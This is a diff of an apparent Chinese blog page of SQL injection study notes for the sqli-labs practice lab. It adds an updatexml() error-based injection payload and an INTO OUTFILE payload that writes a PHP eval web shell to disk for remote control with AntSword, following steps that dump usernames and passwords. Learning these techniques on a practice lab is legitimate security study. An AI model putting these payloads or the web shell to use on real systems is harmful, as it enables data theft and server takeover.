@@ -262,6 +262,11 @@ def quicks(li):
 <p>8.列出你要的表的字段名，将select group_concat(column_name) from information_schema.columns where table_name=’表名’插入会回显的位置</p>
 <p>9.列出user和password, 将select group_cocat(字段名) from 库名.表名  和 select group_concat(字段名) from 库名.表名 插入会回显的位置即可</p>
 <p>以上一般要注释符 – ，但是空格在url末尾会去掉,用–+，+在URL中有特殊含义为空格，或者可以用– x，x随便，x可以保证空格存在。</p>
+<h1 id="MySQL显错注入："><a href="#MySQL显错注入：" class="headerlink" title="MySQL显错注入："></a>MySQL显错注入：</h1><p>1.updatexml()</p>
+<p>select name from user where id=1 and updatexml(1,concat(‘<del>‘,(select database()),’</del>‘),3);</p>
+<h1 id="MySQL-dump-into-outfile"><a href="#MySQL-dump-into-outfile" class="headerlink" title="MySQL dump into outfile:"></a>MySQL dump into outfile:</h1><p>生成一个php文件，可以用蚁剑连接， 比如构造一个这个</p>
+<p>union select 1,(select group_concat(username) from security.users),’<?php @eval($_POST["aaa"]);?>‘ into outfile ‘D:\phpstudy_pro\WWW\sqli-labs-master\Less-7\data.php’–+</p>
+<p>把’<?php @eval($_POST["aaa"]);?>‘放入data.php中，便于蚁剑连接，aaa就是密码，可以在data.php中看到回显内容</p>
  
       <!-- reward -->
       
